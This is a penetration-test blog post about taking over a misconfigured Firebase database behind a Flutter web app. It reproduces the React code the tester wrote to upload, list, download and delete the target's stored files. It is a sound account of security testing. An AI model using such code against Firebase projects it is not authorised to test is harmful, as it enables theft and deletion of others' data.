---
layout: post
title: "Pentest Diaries: Complete Takeover of Firebase Database in Web Application"
tags:
  - Penetration Test
  - Offensive Security
author: "Najam Ul Saqib"
comments: true
description: "I in a penetration test got complete access to Firebase database of a Flutter app; Firebase databases are usually linked with mobile apps so this was a unique experience for me."
date: "2024-04-19"
---

On a recent penetration test engagement, I was given a single URL of web application which upon initial reconnaissance turned out to be a Flutter-based application. The application was using web-sockets heavily (I'm observing rising adoption of web-sockets in web apps).

Testing web-sockets is not easy and usually very cumbersome; specially when web-sockets is using some sort of special encoding and often web-sockets are sending multiple messages in a short span of time so it becomes even more difficult to track the functionality of application.

After peeking for some time into web-sockets I couldn't find anything interesting since it was using socket.io library so most of the messages was from the library itself.

I started to look for HTTP messages, which revealed heavy reliance of application on Google products i.e. it was using Google Identity Platform, usage of Firebase as database, and other misc. Google services so definitely attack surface of cloud was there.

That's when I found an interesting endpoint `https://firebase.googleapis.com/v1alpha/projects/-/apps/1:106407******:web:c587eda2473********/webConfig` and request/response looked like this:

![Firebase Configuration](/assets/images/posts/firebase-takeover/config-request.png){:style="display:block; margin-left:auto; margin-right:auto"}

Now I wanted to know how this configuration can be exploited, upon searching for relevant writeups I noticed nearly all of the write-ups referenced to Android apps as Firebase DBs are more commonly used with mobile apps; but it was clear that the information that I've got is not usual.

Upon further research, I found NPM package for Firebase which meant I can build a Javascript app to consume Firebase database, and I followed the following article to create baseline app for Firebase: [Upload files to Firebase Cloud Storage in Firebase v9 with React](https://blog.logrocket.com/firebase-cloud-storage-firebase-v9-react/) and then tweaked it further to perform CRUD operations on the database.

The tweaked version of React app is uploaded on my Github profile which can be accessed [here](https://github.com/njmulsqb/Firebase-Access-Tester)

```js
import "./App.css";
import { useState } from "react";
import { storage } from "./firebase";
import {
  ref,
  getDownloadURL,
  uploadBytesResumable,
  listAll,
  deleteObject,
} from "firebase/storage";

function App() {
  const [imgUrl, setImgUrl] = useState(null);
  const [progressPercent, setProgressPercent] = useState(0);
  const [deleteFileName, setDeleteFileName] = useState("");

  const handleSubmit = (e) => {
    e.preventDefault();
    const file = e.target[0]?.files[0];
    if (!file) return;
    const storageRef = ref(storage, `files/${file.name}`);
    const uploadTask = uploadBytesResumable(storageRef, file);

    uploadTask.on(
      "state_changed",
      (snapshot) => {
        const progress = Math.round(
          (snapshot.bytesTransferred / snapshot.totalBytes) * 100
        );
        setProgressPercent(progress);
      },
      (error) => {
        alert(error);
      },
      () => {
        getDownloadURL(uploadTask.snapshot.ref).then((downloadURL) => {
          setImgUrl(downloadURL);
        });
      }
    );
  };

  const handleDownloadAllContent = () => {
    const storageRef = ref(storage, "files/");

    listAll(storageRef)
      .then((res) => {
        res.items.forEach((itemRef) => {
          getDownloadURL(itemRef)
            .then((downloadURL) => {
              console.log("Downloading:", downloadURL);
            })
            .catch((error) => {
              console.error("Error getting download URL:", error);
            });
        });
      })
      .catch((error) => {
        console.error("Error listing items:", error);
      });
  };

  const handleDeleteFile = () => {
    const fileRef = ref(storage, `files/${deleteFileName}`);
    deleteObject(fileRef)
      .then(() => {
        console.log(`${deleteFileName} deleted successfully`);
        setDeleteFileName("");
      })
      .catch((error) => {
        console.error("Error deleting file:", error);
      });
  };

  return (
    <div className="App">
      <form onSubmit={handleSubmit} className="form">
        <input type="file" />
        <button type="submit">Upload</button>
      </form>
      <button onClick={handleDownloadAllContent}>Download All Content</button>
      <div className="delete-file">
        <input
          type="text"
          value={deleteFileName}
          onChange={(e) => setDeleteFileName(e.target.value)}
          placeholder="Enter filename to delete"
        />
        <button onClick={handleDeleteFile}>Delete File</button>
      </div>
      {!imgUrl && (
        <div className="progress-bar">
          <div className="inner-bar" style={{ width: `${progressPercent}%` }}>
            {progressPercent}%
          </div>
        </div>
      )}
      {imgUrl && <img src={imgUrl} alt="uploaded file" height={200} />}
    </div>
  );
}

export default App;

```
I know the implementation is dirty, but as long as it worked I am okay with it, also the target was to test the DB not to build a responsive web app ;)

Utilizing Firebase library, I was able to access database, upload files, delete files and dump all the data as well, so it was a big win.

![Firebase Data](/assets/images/posts/firebase-takeover/firebase-json.png){:style="display:block; margin-left:auto; margin-right:auto"}

While app frameworks are becoming secure but misconfigurations in cloud are also getting common as their integration with web apps is increasing with every rising day.

Happy Hunting!
